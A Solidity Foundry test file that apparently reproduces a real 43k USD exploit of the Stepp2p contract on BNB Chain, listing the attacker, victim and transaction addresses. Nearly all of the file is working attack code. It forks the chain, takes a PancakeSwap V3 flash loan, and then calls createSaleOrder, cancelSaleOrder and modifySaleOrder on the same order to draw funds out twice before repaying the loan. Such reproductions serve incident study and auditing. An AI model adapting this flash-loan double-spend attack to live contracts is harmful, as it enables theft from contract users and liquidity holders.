// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 43k USD
// Attacker : https://bscscan.com/address/0xd7235d08a48cbd3f63b9faa16130f2fdb50b2341
// Attack Contract : https://bscscan.com/address/0x399eff46b7d458575ebbbb572098e62e38f3c993
// Vulnerable Contract : https://bscscan.com/address/0x99855380e5f48db0a6babeae312b80885a816dce
// Attack Tx : https://bscscan.com/tx/0xe94752783519da14315d47cde34da55496c39546813ef4624c94825e2d69c6a8

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x99855380e5f48db0a6babeae312b80885a816dce#code

// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/TenArmorAlert/status/1946887946877149520
// Hacking God : N/A
pragma solidity ^0.8.0;

address constant PANCAKE_V3_USDC_USDT = 0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb;
address constant STEPP2P = 0x99855380E5f48Db0a6BABeAe312B80885a816DCe;
address constant BSC_USD = 0x55d398326f99059fF775485246999027B3197955;

contract Stepp2p is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 54653987 - 1;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = BSC_USD;
    }

    function testExploit() public balanceLog {
        //implement exploit code here
        bytes memory data = "0x623269464a7178";
        IPancakeV3PoolActions(PANCAKE_V3_USDC_USDT).flash(address(this), 50_000 ether, 0, data);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) public {
        uint256 amount = IERC20(BSC_USD).balanceOf(STEPP2P);

        IERC20(BSC_USD).approve(STEPP2P, amount);
        uint256 saleId = IStepp2p(STEPP2P).createSaleOrder(amount);
        // cancelSaleOrder + modifySaleOrder on same saleId both transfer funds — results in double spend.
        IStepp2p(STEPP2P).cancelSaleOrder(saleId);
        IStepp2p(STEPP2P).modifySaleOrder(saleId, amount, false);

        IERC20(BSC_USD).transfer(PANCAKE_V3_USDC_USDT, 50_000 ether + fee0);
    }
}

interface IStepp2p {
    function createSaleOrder(uint256 _amount) external returns (uint256);
    function cancelSaleOrder(uint256 _saleId) external;
    function modifySaleOrder(uint256 _saleId, uint256 _modifyAmount, bool isPostive) external;
}
